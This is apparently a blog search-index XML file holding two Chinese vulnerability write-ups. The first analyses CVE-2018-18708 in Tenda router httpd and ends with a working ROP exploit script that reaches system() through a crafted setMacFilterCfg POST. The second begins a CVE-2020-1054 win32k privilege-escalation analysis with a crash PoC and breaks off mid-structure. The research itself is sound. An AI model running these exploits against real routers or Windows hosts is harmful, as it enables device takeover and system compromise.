<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2018-18708 Tenda路由器栈溢出分析</title>
    <url>/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2018-18708是Tenda路由器的httpd存在缓冲区溢出漏洞。可以利用该漏洞造成拒绝服务。</p>
<p>影响版本：</p>
<pre class="line-numbers language-none"><code class="language-none">AC7 V15.03.06.44_CN
AC9 V15.03.05.19_CN
AC10 V15.03.06.23_CN
AC15 V15.03.05.19_CN
AC18 V15.03.05.19(6318)_CN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h3><p>US_AC15V1.0BR_V15.03.05.19_multi_TD01</p>
<h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>提取固件运行httpd可执行文件</p>
<pre class="line-numbers language-none"><code class="language-none">binwalk -Me US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查看文件信息，是arm</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116165640011.png"></p>
<p>qemu执行</p>
<pre class="line-numbers language-none"><code class="language-none">cd _US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root
cp $(which qemu-arm-static) ./
sudo chroot ./ ./qemu-arm-static ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>会卡在Welcome to</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114111007129.png"></p>
<h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>ida分析发现sub_2E420，发现welcome to之后有两处check，第一处check不通过会进入休眠状态，第二个检查连接情况，不通过会打印连接失败。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114112513082.png"></p>
<p>patch掉这两处的检测</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144110897.png"></p>
<p>patch掉之后继续执行</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144236394.png"></p>
<p>安装uml-utilities</p>
<pre class="line-numbers language-none"><code class="language-none">sudo apt install uml-utilities<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>安装bridge-utils</p>
<pre class="line-numbers language-none"><code class="language-none">https://mirrors.edge.kernel.org/pub/linux/utils/net/bridge-utils/bridge-utils-1.7.1.tar.xz
tar -xvf bridge-utils-1.7.1.tar.xz
autoconf
./configure
make
sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113136378.png"></p>
<h4 id="定位ip"><a href="#定位ip" class="headerlink" title="定位ip"></a>定位ip</h4><p>搜索字符串Listen ip定位到sub_1B84C函数</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113711000.png"></p>
<p>分析调用链</p>
<p><code>sub_2E420 -&gt; sub_2E9EC -&gt; sub_29510  -&gt; sub_29818 -&gt;  sub_1B84C</code></p>
<p>函数sub_29818调用了sub_1B84C</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115132854149.png"></p>
<pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpd
gdb-multiarch
set architecture arm
b*0x1B84C
target remote:1111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115142522808.png"></p>
<p>对ip参数v8进行定位</p>
<p>v8和s.sa_data[2]、a1有关</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143459247.png"></p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143338834.png"></p>
<p>往上回溯，sub_29818调用了sub_1B84C，sub_29818的v8是了sub_1B84C的第一个参数a1</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115144144585.png"></p>
<p>往上回溯到sub_2E420，ip的值与s和v19有关。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115150620540.png"></p>
<p>查看getIfIp</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115151018366.png"></p>
<p>getIfIp为外部导入函数，位于libcommon.so中</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160146351.png"></p>
<p>ioctl有三个参数，第一个参数fd由socket()系统调用返回，第二个参数获取IP地址。第三个参数与getLanIfName函数有关。</p>
<p>因此函数整体流程为获取IP地址返回v2，v2的值为0不会进入if循环，ip的值由v19决定，v19是getIfIp函数的第二个参数v2，系统调用获取IP后赋给a2(v19)。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160907362.png"></p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161237390.png"></p>
<p>getLanIfName会调用get_eth_name函数，参数写死为0，get_eth_name在libChipApi.so中，查看libChipApi.so中的get_eth_name函数，函数返回v1，为网卡名称</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161516417.png"></p>
<h4 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h4><p>因此整体流程为getLanIfName函数调用get_eth_name函数获取网卡名称，将网卡名称做为参数输入到getIfIp中。函数寻找名称为br0的网卡的ip地址传递给v19。因此让程序监听正确的ip地址需要新建br0网卡。</p>
<pre class="line-numbers language-none"><code class="language-none">sudo brctl addbr br0 
sudo brctl addif br0 eth0
sudo ifconfig br0 up
sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>重新启动找到了br0网卡并获取了ip地址</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141128835.png"></p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141227111.png"></p>
<h3 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h3><pre class="line-numbers language-none"><code class="language-none">函数调用关系：sub_2E420 -&gt;  sub_2E9EC  -&gt;  sub_42378  -&gt;  formSetMacFilterCfg  -&gt;  sub_C14DC  -&gt;  sub_C17A0  -&gt;  sub_C24C0
缓冲区：sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12
字符串src：sub_2BA8C的返回值 -&gt; formSetMacFilterCfg的v17 -&gt; sub_C14DC的a2 -&gt; sub_C17A0的a2 -&gt; sub_C24C0的a1 -&gt; src<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="sub-C24C0"><a href="#sub-C24C0" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p>漏洞点在sub_C24C0的strcpy函数</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114180104515.png"></p>
<h4 id="sub-C17A0"><a href="#sub-C17A0" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>溢出字符串src是sub_C24C0函数的第一个参数a1，来自sub_C17A0的第二个参数a2</p>
<p>缓冲区a2是sub_C24C0函数的第二个参数a2，来自sub_C17A0的v12。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110605912.png"></p>
<h4 id="sub-C14DC"><a href="#sub-C14DC" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p>sub_C17A0的第二个参数a2来自sub_C14DC的第二个参数a2</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110852924.png"></p>
<h4 id="formSetMacFilterCfg"><a href="#formSetMacFilterCfg" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数调用了sub_C14DC，sub_C14DC的第二个参数a2来自formSetMacFilterCfg的v17，v17是sub_2BA8C的返回值，程序获取到http请求的deviceList的值，传递给sub_C24C0函数的漏洞点。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115100854082.png"></p>
<h3 id="调用链分支跳转"><a href="#调用链分支跳转" class="headerlink" title="调用链分支跳转"></a>调用链分支跳转</h3><p>函数中有不同功能的处理函数，显示请求到指定路径会调用相应的处理函数。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115172430094.png"></p>
<p>进入formSetMacFilterCfg函数需要访问/goform/setMacFilterCfg</p>
<h4 id="formSetMacFilterCfg-1"><a href="#formSetMacFilterCfg-1" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数存在两个分支，sub_C10D0和sub_C14DC</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173154042.png"></p>
<p>v19为0才会进入sub_C14DC函数，因此sub_C10D0的返回值需要为0</p>
<h4 id="sub-C10D0"><a href="#sub-C10D0" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173814704.png"></p>
<p>sub_C10D0的返回值为0需要输入的数据a1为black或者white</p>
<h4 id="sub-C24C0-1"><a href="#sub-C24C0-1" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115174215338.png"></p>
<p>最终到达漏洞点之后会检测包含\r的字符串</p>
<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>访问 <a href="http://192.168.130.137/goform/setMacFilterCfg">http://192.168.130.137/goform/setMacFilterCfg</a> 抓包</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141526174.png"></p>
<p>返回{“errCode”:2}</p>
<h4 id="formSetMacFilterCfg-2"><a href="#formSetMacFilterCfg-2" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>进入formSetMacFilterCfg函数，查看setMacFilterCfg接口对应的处理过程。</p>
<p>调用了sub_2BA8C 和 sub_C10D0和sub_C10DC</p>
<p>sub_2BA8C获取前端传过来的表单中获取对应的值。之后传入sub_C210D0</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115183255078.png"></p>
<p>之后会对v19进行判断</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193726115.png"></p>
<h4 id="sub-C10D0-1"><a href="#sub-C10D0-1" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p>对传入的值进行strcmp比较，决定返回的值。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193936050.png">判断是black还是white，如果满足其中一个返回0，否则返回2。如果没有就会返回2，所以抓包返回结果为{“errCode”:2}</p>
<p>所以必须传参setMacFilterCfg为black或者white</p>
<h4 id="sub-C14DC-1"><a href="#sub-C14DC-1" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115195021958.png"></p>
<p>第二个参数是需要有\n，并且返回其地址。</p>
<p>之后都会进入sub_C17A0函数</p>
<h4 id="sub-C17A0-1"><a href="#sub-C17A0-1" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>调用了sub_C24C0，将deviceList和v12传入</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093215098.png"></p>
<h4 id="sub-C24C0-2"><a href="#sub-C24C0-2" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093614037.png"></p>
<h3 id="触发测试"><a href="#触发测试" class="headerlink" title="触发测试"></a>触发测试</h3><p>sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12，大小为176</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117141812438.png"></p>
<p>根据http post请求内容构造</p>
<pre class="line-numbers language-none"><code class="language-none">import requests
url = "http://192.168.130.137/goform/setMacFilterCfg"
cookie = {"Cookie":"password=csplqw"}
data = {"macFilterType": "black", "deviceList":"\r" +  "A" * 176 + "bbbb"}
requests.post(url, cookies=cookie, data=data)
requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>测试</p>
<pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpd

gdb-multiarch ./bin/httpd
target remote:1111

python poc.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117144236144.png"></p>
<p>正好覆盖</p>
<h2 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p>开启了NX保护</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117145129715.png"></p>
<h3 id="libc基址"><a href="#libc基址" class="headerlink" title="libc基址"></a>libc基址</h3><p>strcpy函数下断点找函数地址，0x3fdda508</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118173858830.png"></p>
<p>找偏移</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174133012.png"></p>
<p>算基址</p>
<p>0x3fdda508-3e508=0x3fd9C000</p>
<h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><pre class="line-numbers language-none"><code class="language-none">ROPgadget --binary libc.so.0 --only "pop" | grep r3
ROPgadget --binary libc.so.0 | grep "mov r0, sp ; blx r3"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155024462.png"></p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155334715.png"></p>
<p>使用<code>0x00018298 : pop {r3, pc}</code>和 <code>0x00040cb8 : mov r0, sp ; blx r3</code>来构造rop。将第一个r3改成system_addr，将命令放在sp上，之后跳转到system_addr。</p>
<h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p><code>readelf -s libc.so.0 | grep system</code>找system偏移</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117161402380.png"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>payload结构：[offset,gadget1,system,gadget2]</p>
<pre class="line-numbers language-none"><code class="language-none">import requests
from pwn import *
cmd = b"echo hello"
libc_base = 0x3fd9C000
system_offset = 0x005a270
gadget1_offset = 0x00018298
gadget2_offset = 0x00040cb8
system_addr = libc_base + system_offset
gadget1 = gadget1_offset + libc_base
gadget2 = gadget2_offset + libc_base
payload = b"A"*176 + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd
url = "http://192.168.130.137/goform/setMacFilterCfg"
cookie = {"Cookie":"password=csplqw"}
data = {"macFilterType": "black", "deviceList":b"\r" + payload}
requests.post(url, cookies=cookie, data=data)
requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174737035.png"></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-1054越界写入本地提权分析</title>
    <url>/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2020-1054是win32k.sys内核模块的oob(out of band)漏洞。成功利用可以导致权限提升。漏洞存在于win32k!vStrWrite01函数中，函数在对BitMap对象中的pvScan0成员指向的像素区域进行读写的时候，没有判断读写的地址是否超过BitMap对象的像素点范围，是否越界，导致BSOD的产生。通过合理的内存布局，可以利用漏洞扩大目标BitMap对象的sizelBitmap来扩大BitMap对象的可读写范围，利用扩大读写范围的BitMap对象来修改另一个BitMap对象的pvScan0就能实现任意地址读写。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="蓝屏poc"><a href="#蓝屏poc" class="headerlink" title="蓝屏poc"></a>蓝屏poc</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">##include <span class="token operator">&lt;</span>Windows<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
##include <span class="token operator">&lt;</span>inttypes<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
##include <span class="token operator">&lt;</span>stdint<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
##include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
##include <span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    HDC r0 <span class="token operator">=</span> <span class="token function">CreateCompatibleDC</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建与指定设备兼容的内存设备上下文环境</span>
    HBITMAP r1 <span class="token operator">=</span> <span class="token function">CreateCompatibleBitmap</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> <span class="token number">0x9f42</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建与指定设备环境相关的设备兼容位图</span>
    <span class="token comment">//HBITMAP r1 = CreateCompatibleBitmap(r0, 0x51500, 0x100);//创建与指定设备环境相关的设备兼容位图</span>
    <span class="token function">SelectObject</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> r1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//选择一对象到指定的设备上下文环境中，该对象替换先前的相同类型对象</span>
    <span class="token function">DrawIconEx</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>HICON<span class="token punctuation">)</span><span class="token number">0x30000010003</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0xfffffffffebffffc</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>CreateCompatibleBitmap</strong></p>
<p>创建与指定设备上下文关联的设备兼容位图</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">HBITMAP <span class="token function">CreateCompatibleBitmap</span><span class="token punctuation">(</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> HDC hdc<span class="token punctuation">,</span> <span class="token comment">//设备上下文的句柄</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span> cx<span class="token punctuation">,</span>  <span class="token comment">//位图宽度</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span> cy   <span class="token comment">//位图高度</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>DrawIconEx</strong></p>
<p>将图标和光标绘制到指定设备上下文中，执行指定光栅操作，指定拉伸或压缩图标光标。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">BOOL <span class="token function">DrawIconEx</span><span class="token punctuation">(</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           HDC    hdc<span class="token punctuation">,</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    xLeft<span class="token punctuation">,</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    yTop<span class="token punctuation">,</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           HICON  hIcon<span class="token punctuation">,</span><span class="token comment">//绘制图标和光标的句柄</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    cxWidth<span class="token punctuation">,</span><span class="token comment">//图标或光标逻辑宽度</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    cyWidth<span class="token punctuation">,</span><span class="token comment">//图标或光标逻辑高度</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           UINT   istepIfAniCur<span class="token punctuation">,</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">,</span> optional<span class="token punctuation">]</span> HBRUSH hbrFlickerFreeDraw<span class="token punctuation">,</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           UINT   diFlags
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>崩溃地址为win32k!vStrWrite01+0x36a</p>
<h3 id="vStrWrite01"><a href="#vStrWrite01" class="headerlink" title="vStrWrite01"></a>vStrWrite01</h3><p>StrWrite01(struct _STRRUN *prun, struct _XRUNLEN *a2, struct SURFACE *pSurf, struct _CLIPOBJ *a4)</p>
<pre class="line-numbers language-none"><code class="language-none">OID vStrWrite01(STRRUN  *prun, 
                 XRUNLEN *pxrlEnd,
                 SURFACE *pSurf,
                 CLIPOBJ *pco)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><pre class="line-numbers language-none"><code class="language-none">typedef struct _XRUNLEN
{
    LONG    xPos;
    LONG    cRun;
    LONG    aul[1];
} XRUNLEN;
 
typedef struct _STRRUN
{
    LONG    yPos;
    LONG    cRep;
    XRUNLEN xrl;
} STRRUN;
 
 
typedef struct tagSIZE {
    LONG cx;
    LONG cy;
} SIZE,*PSIZE,*LPSIZE;
  
typedef SIZE SIZEL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>BASEOBJECT结构体</p>
<pre class="line-numbers language-none"><code class="language-none">typedef struct _BASEOBJECT64{
  ULONG64 hHmgr;     // 0x00
